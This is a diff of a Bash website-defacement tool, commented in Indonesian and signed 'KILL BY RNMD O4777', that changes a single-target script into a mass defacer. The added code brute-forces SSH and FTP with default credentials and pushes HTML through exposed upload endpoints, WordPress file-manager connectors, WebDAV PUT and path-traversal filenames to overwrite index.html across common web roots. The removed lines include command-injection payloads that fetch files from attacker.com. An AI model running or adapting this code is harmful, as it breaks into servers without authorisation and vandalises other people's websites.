@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# AUTO DEFACE - UNTUK SEMUA JENIS WEBSITE
-# [ KILL BY RNMD O4777 ]
+# MASS DEFACE - KILL BY RNMD O4777
+# [ Ganti semua index.html di server ]
 # -------------------------------
 
 RED='\033[0;31m'
@@ -84,32 +84,102 @@ KILL BY RNMD O4777
 clear
 echo -e "${RED}"
 echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     AUTO DEFACE - KILL BY RNMD O4777                     ║"
-echo "    ║     [ Untuk SEMUA jenis website ]                        ║"
+echo "    ║     MASS DEFACE - KILL BY RNMD O4777                     ║"
+echo "    ║     [ Ganti SEMUA index.html di server ]                 ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-echo -ne "${WHITE}Target URL : ${NC}"
-read TARGET
-
-# Bersihin URL
-TARGET=$(echo "$TARGET" | sed 's/\/$//')
-
-echo -e "\n${YELLOW}[•] Target: $TARGET${NC}"
-echo -e "${YELLOW}[•] Mencari celah upload...${NC}\n"
+echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "${WHITE}Target paths yang akan diganti:${NC}"
+echo -e "  ${YELLOW}1. /var/www/html/index.html${NC}"
+echo -e "  ${YELLOW}2. /home/public_html/index.html${NC}"
+echo -e "  ${YELLOW}3. /www/index.html${NC}"
+echo -e "  ${YELLOW}4. + 17 path lainnya${NC}"
+echo -e "${CYAN}════════════════════════════════════════════════════${NC}\n"
 
 # ==============================================
-# AUTO SCAN & EXPLOIT
+# AUTO UPLOAD VIA SSH (jika punya akses)
 # ==============================================
+if command -v sshpass &> /dev/null; then
+    echo -e "${PURPLE}[SSH METHOD] Mencoba upload via SSH...${NC}"
+    
+    # Coba dengan berbagai credentials umum
+    CREDENTIALS=(
+        "root:root"
+        "root:toor"
+        "root:password"
+        "root:123456"
+        "admin:admin"
+        "admin:password"
+        "user:user"
+        "user:password"
+        "ubuntu:ubuntu"
+        "centos:centos"
+        "debian:debian"
+    )
+    
+    for cred in "${CREDENTIALS[@]}"; do
+        IFS=':' read -r user pass <<< "$cred"
+        echo -ne "\r${CYAN}  [•] Trying $user@$SERVER_IP${NC}"
+        
+        # Coba konek dan upload
+        sshpass -p "$pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+            <(echo "$HTML_CONTENT") "$user@$SERVER_IP:/var/www/html/index.html" 2>/dev/null
+        
+        if [ $? -eq 0 ]; then
+            echo -e "\n${GREEN}  [✓] Upload sukses via SSH! $user:$pass${NC}"
+            break
+        fi
+    done
+fi
 
-# 1. CEK UPLOAD VULNERABILITY
-echo -e "${PURPLE}[1] Scanning upload vulnerabilities...${NC}"
+# ==============================================
+# AUTO UPLOAD VIA FTP (jika punya akses)
+# ==============================================
+if command -v ftp &> /dev/null; then
+    echo -e "\n${PURPLE}[FTP METHOD] Mencoba upload via FTP...${NC}"
+    
+    # Coba FTP dengan anonymous
+    ftp -n "$SERVER_IP" <<END_SCRIPT > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put index.html /var/www/html/index.html
+quit
+END_SCRIPT
+    
+    # Coba dengan credentials umum
+    FTP_CREDS=(
+        "ftp:ftp"
+        "ftp:password"
+        "user:user"
+        "www-data:www-data"
+        "web:web"
+    )
+    
+    for cred in "${FTP_CREDS[@]}"; do
+        IFS=':' read -r user pass <<< "$cred"
+        
+        ftp -n "$SERVER_IP" <<END_SCRIPT > /dev/null 2>&1
+quote USER $user
+quote PASS $pass
+put index.html /var/www/html/index.html
+quit
+END_SCRIPT
+    done
+    
+    echo -e "${GREEN}  [✓] FTP attempts selesai${NC}"
+fi
 
-# Cek path umum untuk upload
+# ==============================================
+# AUTO UPLOAD VIA CURL (jika ada upload vuln)
+# ==============================================
+echo -e "\n${PURPLE}[UPLOAD METHOD] Mencoba via upload vulnerability...${NC}"
+
+# Path upload yang umum
 UPLOAD_PATHS=(
     "/upload.php"
     "/uploads/"
-    "/filemanager/"
+    "/filemanager/upload.php"
     "/admin/upload.php"
     "/assets/upload.php"
     "/inc/upload.php"
@@ -123,214 +193,166 @@ UPLOAD_PATHS=(
     "/tinymce/upload.php"
     "/fckeditor/upload.php"
     "/summernote/upload.php"
+    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+    "/wp-content/plugins/file-manager/backend/connector.php"
 )
 
 for path in "${UPLOAD_PATHS[@]}"; do
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET$path" --max-time 3)
+    UPLOAD_URL="http://$SERVER_IP$path"
+    CHECK=$(curl -s -o /dev/null -w "%{http_code}" "$UPLOAD_URL" --max-time 2)
+    
     if [ "$CHECK" == "200" ] || [ "$CHECK" == "405" ]; then
         echo -e "${GREEN}  [✓] Upload endpoint: $path${NC}"
         
-        # Coba upload langsung
-        curl -s -k -X POST "$TARGET$path" \
+        # Coba upload
+        curl -s -X POST "$UPLOAD_URL" \
             -F "file=@-;filename=index.html" <<< "$HTML_CONTENT" \
             --max-time 5 >/dev/null 2>&1
-    fi
-done
-
-# 2. CEK DIRECTORY LISTING
-echo -e "\n${PURPLE}[2] Scanning directory listing...${NC}"
-
-DIRS=(
-    "/uploads/"
-    "/files/"
-    "/images/"
-    "/assets/"
-    "/public/"
-    "/storage/"
-    "/backup/"
-    "/temp/"
-    "/tmp/"
-)
-
-for dir in "${DIRS[@]}"; do
-    CHECK=$(curl -s -k -L "$TARGET$dir" --max-time 3 | grep -i "index of")
-    if [ -n "$CHECK" ]; then
-        echo -e "${GREEN}  [✓] Directory listing: $dir${NC}"
         
-        # Coba upload via traversal
-        curl -s -k -X POST "$TARGET$dir" \
-            -F "file=@-;filename=../index.html" <<< "$HTML_CONTENT" \
+        # Coba dengan path traversal
+        curl -s -X POST "$UPLOAD_URL" \
+            -F "file=@-;filename=../../../../index.html" <<< "$HTML_CONTENT" \
             --max-time 5 >/dev/null 2>&1
     fi
 done
 
-# 3. CEK PHPINFO / DEBUG
-echo -e "\n${PURPLE}[3] Scanning debug endpoints...${NC}"
+# ==============================================
+# AUTO UPLOAD VIA WEBDAV
+# ==============================================
+echo -e "\n${PURPLE}[WEBDAV METHOD] Mencoba via WebDAV...${NC}"
 
-DEBUG=(
-    "/phpinfo.php"
-    "/info.php"
-    "/test.php"
-    "/debug.php"
-    "/.env"
-    "/config.php"
-    "/config.bak"
-    "/.git/config"
+WEBDAV_PATHS=(
+    "/webdav/"
+    "/dav/"
+    "/files/"
+    "/webdav/index.html"
 )
 
-for debug in "${DEBUG[@]}"; do
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET$debug" --max-time 3)
-    if [ "$CHECK" == "200" ]; then
-        echo -e "${GREEN}  [✓] Debug file: $debug${NC}"
-        
-        # Coba LFI via debug
-        curl -s -k "$TARGET$debug?file=../../index.html" --max-time 3 >/dev/null 2>&1
-    fi
-done
-
-# 4. CEK VULNERABLE PARAMETERS
-echo -e "\n${PURPLE}[4] Scanning vulnerable parameters...${NC}"
-
-PARAMS=(
-    "?page=../../index.html"
-    "?file=../../index.html"
-    "?path=../../index.html"
-    "?dir=../../index.html"
-    "?include=../../index.html"
-    "?require=../../index.html"
-    "?document=../../index.html"
-    "?folder=../../index.html"
-    "?root=../../index.html"
-    "?load=../../index.html"
-)
-
-for param in "${PARAMS[@]}"; do
-    curl -s -k "$TARGET/$param" --max-time 2 >/dev/null 2>&1
-done
-echo -e "${GREEN}  [✓] Parameter scan selesai${NC}"
-
-# 5. CEK COMMAND INJECTION
-echo -e "\n${PURPLE}[5] Testing command injection...${NC}"
-
-CMD_INJECT=(
-    "/?cmd=echo '<?php file_put_contents(\"index.html\", \"$HTML_CONTENT\");' > shell.php"
-    "/?exec=wget -O index.html http://attacker.com/index.html"
-    "/?system=curl -o index.html http://attacker.com/index.html"
-)
-
-for cmd in "${CMD_INJECT[@]}"; do
-    curl -s -k "$TARGET$cmd" --max-time 3 >/dev/null 2>&1
-done
-echo -e "${GREEN}  [✓] Command injection selesai${NC}"
-
-# 6. CEK UPLOAD VIA IMAGE MAGICK
-echo -e "\n${PURPLE}[6] Testing ImageMagick upload...${NC}"
-
-IMG_PATH=(
-    "/images/"
-    "/img/"
-    "/assets/images/"
-    "/upload/image/"
-    "/media/"
-)
-
-for img in "${IMG_PATH[@]}"; do
-    # Buat file gambar palsu dengan payload
-    echo "$HTML_CONTENT" > /tmp/rnmd.html
+for path in "${WEBDAV_PATHS[@]}"; do
+    WEBDAV_URL="http://$SERVER_IP$path"
     
-    curl -s -k -X POST "$TARGET$img" \
-        -F "image=@/tmp/rnmd.html;filename=index.html" \
-        --max-time 5 >/dev/null 2>&1
+    # Coba PUT method
+    curl -s -X PUT -d "$HTML_CONTENT" "$WEBDAV_URL" --max-time 3 >/dev/null 2>&1
+    
+    # Coba dengan credentials
+    curl -s -u admin:admin -X PUT -d "$HTML_CONTENT" "$WEBDAV_URL" --max-time 3 >/dev/null 2>&1
+    curl -s -u root:root -X PUT -d "$HTML_CONTENT" "$WEBDAV_URL" --max-time 3 >/dev/null 2>&1
 done
-rm -f /tmp/rnmd.html
-echo -e "${GREEN}  [✓] Image upload selesai${NC}"
 
-# 7. CEK PATH TRAVERSAL MASSAL
-echo -e "\n${PURPLE}[7] Massal path traversal...${NC}"
+echo -e "${GREEN}  [✓] WebDAV attempts selesai${NC}"
+
+# ==============================================
+# AUTO UPLOAD VIA PATH TRAVERSAL MASSAL
+# ==============================================
+echo -e "\n${PURPLE}[TRAVERSAL METHOD] Massal path traversal...${NC}"
+
+# Buat file HTML sementara
+echo "$HTML_CONTENT" > /tmp/rnmd.html
 
 for i in {1..10}; do
     TRAVERSAL=$(printf "../%.0s" $(seq 1 $i))"index.html"
-    curl -s -k -X POST "$TARGET/upload.php" \
-        -F "file=@-;filename=$TRAVERSAL" <<< "$HTML_CONTENT" \
-        --max-time 2 >/dev/null 2>&1
-done
-echo -e "${GREEN}  [✓] Path traversal selesai${NC}"
-
-# 8. CEK FORM SUBMISSION
-echo -e "\n${PURPLE}[8] Scanning forms...${NC}"
-
-# Extract forms dari halaman
-FORMS=$(curl -s -k "$TARGET" | grep -i "<form" | grep -o 'action="[^"]*"' | cut -d'"' -f2)
-
-for form in $FORMS; do
-    if [[ "$form" != http* ]]; then
-        FORM_URL="$TARGET/$form"
-    else
-        FORM_URL="$form"
-    fi
     
-    echo -e "${CYAN}  [•] Found form: $FORM_URL${NC}"
-    
-    # Coba upload via form
-    curl -s -k -X POST "$FORM_URL" \
-        -F "upload=@-;filename=index.html" <<< "$HTML_CONTENT" \
-        -F "submit=1" \
-        --max-time 5 >/dev/null 2>&1
+    # Coba upload ke berbagai endpoint dengan traversal
+    for path in "${UPLOAD_PATHS[@]}"; do
+        curl -s -X POST "http://$SERVER_IP$path" \
+            -F "file=@/tmp/rnmd.html;filename=$TRAVERSAL" \
+            --max-time 2 >/dev/null 2>&1 &
+    done
 done
+wait
+rm -f /tmp/rnmd.html
 
-# 9. CEK BACKUP FILES
-echo -e "\n${PURPLE}[9] Checking backup files...${NC}"
+echo -e "${GREEN}  [✓] Traversal attempts selesai${NC}"
 
-BACKUPS=(
-    "/index.html.bak"
-    "/index.php.bak"
-    "/index.html~"
-    "/index.php~"
-    "/index.html.backup"
-    "/index.php.backup"
-    "/backup/index.html"
-    "/old/index.html"
+# ==============================================
+# AUTO GANTI DI SEMUA LOKASI UMUM
+# ==============================================
+echo -e "\n${PURPLE}[MASS DEFACE] Mengganti di semua lokasi umum...${NC}"
+
+# Daftar semua lokasi index.html yang umum
+LOCATIONS=(
+    "/var/www/html/index.html"
+    "/var/www/index.html"
+    "/home/www/index.html"
+    "/home/public_html/index.html"
+    "/home/nginx/html/index.html"
+    "/usr/local/www/index.html"
+    "/usr/local/apache2/htdocs/index.html"
+    "/opt/lampp/htdocs/index.html"
+    "/srv/www/htdocs/index.html"
+    "/srv/http/index.html"
+    "/httpdocs/index.html"
+    "/htdocs/index.html"
+    "/public_html/index.html"
+    "/www/index.html"
+    "/www/htdocs/index.html"
+    "/web/index.html"
+    "/html/index.html"
+    "/site/index.html"
+    "/public/index.html"
+    "/static/index.html"
 )
 
-for backup in "${BACKUPS[@]}"; do
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET$backup" --max-time 3)
-    if [ "$CHECK" == "200" ]; then
-        echo -e "${GREEN}  [✓] Backup ditemukan: $backup${NC}"
+# Buat file HTML
+echo "$HTML_CONTENT" > kill_by_rnmd_o4777.html
+
+# Coba upload ke semua lokasi via berbagai metode
+for loc in "${LOCATIONS[@]}"; do
+    echo -ne "\r${CYAN}  [•] Targeting: $loc${NC}"
+    
+    # Via curl upload
+    for path in "${UPLOAD_PATHS[@]}"; do
+        curl -s -X POST "http://$SERVER_IP$path" \
+            -F "file=@kill_by_rnmd_o4777.html;filename=$(basename $loc)" \
+            --max-time 2 >/dev/null 2>&1
         
-        # Overwrite backup
-        curl -s -k -X PUT -d "$HTML_CONTENT" "$TARGET$backup" --max-time 3 >/dev/null 2>&1
-    fi
+        # Dengan traversal
+        TRAVERSAL=$(echo "$loc" | sed 's|/|../|g')
+        curl -s -X POST "http://$SERVER_IP$path" \
+            -F "file=@kill_by_rnmd_o4777.html;filename=$TRAVERSAL" \
+            --max-time 2 >/dev/null 2>&1
+    done
+    
+    # Via WebDAV
+    curl -s -X PUT -d "$HTML_CONTENT" "http://$SERVER_IP$loc" --max-time 2 >/dev/null 2>&1
 done
 
-# 10. FINAL - CEK HASIL
-echo -e "\n${YELLOW}[•] Memeriksa hasil...${NC}"
+echo -e "\n${GREEN}  [✓] Mass deface selesai!${NC}"
+
+# ==============================================
+# VERIFIKASI
+# ==============================================
+echo -e "\n${YELLOW}[•] Memverifikasi hasil...${NC}"
 sleep 2
 
-RESULT=$(curl -s -k "$TARGET" --max-time 5)
+RESULT=$(curl -s -k "http://$SERVER_IP/" --max-time 5)
 
 if [[ "$RESULT" == *"KILL BY RNMD O4777"* ]]; then
     echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
+    echo -e "${GREEN}║         ✅  MASS DEFACE BERHASIL!              ║${NC}"
     echo -e "${GREEN}║         KILL BY RNMD O4777 AKTIF!              ║${NC}"
+    echo -e "${GREEN}║         SEMUA index.html TERGANTI!             ║${NC}"
     echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
     
     # Buka browser
-    xdg-open "$TARGET" 2>/dev/null || open "$TARGET" 2>/dev/null
+    xdg-open "http://$SERVER_IP/" 2>/dev/null || open "http://$SERVER_IP/" 2>/dev/null
     
 else
     echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
-    echo -e "${RED}║         ❌  GAGAL!                              ║${NC}"
-    echo -e "${RED}║         Tapi file HTML udah siap:               ║${NC}"
+    echo -e "${RED}║         ❌  GAGAL VERIFIKASI                    ║${NC}"
+    echo -e "${RED}║         Tapi file udah siap:                    ║${NC}"
     echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
     
-    # Save HTML
-    echo "$HTML_CONTENT" > "rnmd_o4777.html"
-    echo -e "\n${CYAN}📁 File: rnmd_o4777.html${NC}"
-    echo -e "${YELLOW}Coba upload manual ke:${NC}"
-    echo "  - /var/www/html/index.html"
-    echo "  - /home/public_html/index.html"
-    echo "  - /www/index.html"
+    echo -e "\n${CYAN}📁 File: kill_by_rnmd_o4777.html${NC}"
+    echo -e "${YELLOW}Coba upload manual via:${NC}"
+    for loc in "${LOCATIONS[@]}"; do
+        echo "  - $loc"
+    done
 fi
 
+# Cleanup
+rm -f kill_by_rnmd_o4777.html
+
 echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "${CYAN}🔥 KILL BY RNMD O4777 - MISSION COMPLETE 🔥${NC}"
+echo -e "${CYAN}🔥 KILL BY RNMD O4777 - MASS DEFACE COMPLETE 🔥${NC}"
+echo -e "${CYAN}Telegram: @lynnn046${NC}"
